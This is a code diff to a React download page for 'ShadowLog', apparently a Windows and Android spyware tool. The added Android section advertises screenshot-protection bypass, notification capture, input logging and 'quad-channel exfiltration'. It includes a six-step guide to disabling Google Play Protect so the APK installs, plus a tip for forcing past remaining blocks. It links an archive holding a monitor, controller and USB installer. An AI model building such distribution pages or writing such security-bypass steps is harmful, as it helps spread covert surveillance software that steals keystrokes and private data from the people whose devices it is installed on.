@@ -5,7 +5,7 @@ import Link from 'next/link';
 
 const TIMER_DURATION = 10;
 const CIRCUMFERENCE = 2 * Math.PI * 36;
-const DOWNLOAD_URL = 'https://github.com/BGx-11/ShadowLog/releases/latest/download/ShadowLog_Release_v4.0.zip';
+const DOWNLOAD_URL = 'https://github.com/BGx-11/ShadowLog/releases/latest/download/ShadowLog_Win_v4.0.zip';
 
 export default function DownloadSection() {
   const [modalOpen, setModalOpen] = useState(false);
@@ -86,6 +86,92 @@ export default function DownloadSection() {
               <svg className="btn-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
               Acquire Archive
             </button>
+          </div>
+
+          <div className="downloadArea downloadAreaMobile reveal delay-2">
+            <div className="downloadPlatformBadge">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+              Android Edition
+            </div>
+            <h2>ShadowLog Mobile</h2>
+            <p>Full Android monitoring suite with FLAG_SECURE screenshot bypass, notification capture, input logging, and quad-channel exfiltration.</p>
+            
+            <div className="downloadMeta">
+              <div className="metaBadge">Version 2.0</div>
+              <div className="metaBadge">Android 8.0+</div>
+              <div className="metaBadge">~2.1 MB each</div>
+            </div>
+
+            {/* ── INLINE PLAY PROTECT BYPASS GUIDE ── */}
+            <div className="installGuide">
+              <div className="installGuideHeader">
+                <div className="installGuideIcon">
+                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                </div>
+                <div>
+                  <h3>⚠️ Required: Disable Play Protect First</h3>
+                  <p>Play Protect <strong>will block installation</strong>. Complete these steps before downloading.</p>
+                </div>
+              </div>
+
+              <div className="installSteps">
+                <div className="installStep">
+                  <div className="installStepNum">1</div>
+                  <div className="installStepText">
+                    Open the <strong>Google Play Store</strong> app
+                  </div>
+                </div>
+                <div className="installStep">
+                  <div className="installStepNum">2</div>
+                  <div className="installStepText">
+                    Tap your <strong>profile icon</strong> (top-right) → tap <strong>Play Protect</strong>
+                  </div>
+                </div>
+                <div className="installStep">
+                  <div className="installStepNum">3</div>
+                  <div className="installStepText">
+                    Tap the <strong>⚙ Settings gear</strong> (top-right corner)
+                  </div>
+                </div>
+                <div className="installStep">
+                  <div className="installStepNum">4</div>
+                  <div className="installStepText">
+                    Toggle <strong>OFF</strong> &quot;Scan apps with Play Protect&quot; → confirm <strong>&quot;Turn off&quot;</strong>
+                  </div>
+                </div>
+                <div className="installStep">
+                  <div className="installStepNum">5</div>
+                  <div className="installStepText">
+                    Download &amp; install the APK below — it will go through now
+                  </div>
+                </div>
+                <div className="installStep">
+                  <div className="installStepNum">6</div>
+                  <div className="installStepText">
+                    <strong>Re-enable Play Protect</strong> after installing (same path, toggle back ON)
+                  </div>
+                </div>
+              </div>
+
+              <div className="installTip">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                <span><strong>Still blocked?</strong> Go to <strong>Settings → Apps → Google Play Store → Force Stop</strong>, then retry. On Samsung/Xiaomi, also check <strong>Settings → Security → Install Unknown Apps</strong> and allow your browser.</span>
+              </div>
+            </div>
+
+            {/* ── ANDROID ARCHIVE DOWNLOAD ── */}
+            <div className="apkDownloadGrid" style={{ gridTemplateColumns: '1fr' }}>
+              <a href="https://github.com/BGx-11/ShadowLog/releases/latest/download/ShadowLog_Android_v4.0.zip" className="apkCard" download>
+                <div className="apkCardIcon">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                </div>
+                <div className="apkCardContent">
+                  <strong>Android Release Archive</strong>
+                  <span>Contains Monitor, Controller, and USB Installer</span>
+                </div>
+                <svg className="apkCardArrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+              </a>
+            </div>
           </div>
         </div>
       </section>
